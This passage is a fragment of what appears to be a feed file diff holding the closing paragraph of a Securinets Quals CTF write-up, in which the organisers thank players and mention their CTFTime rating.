+&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;We hope that everyone enjoyed this edition of Securinets Quals, we were very happy to reach 70 weight in CTFTime so we are now the most rated CTF in MENA Region. We can&amp;rsquo;t wait to see everyone in the finals so soon!&lt;/p&gt;
 </description>
     </item>
     
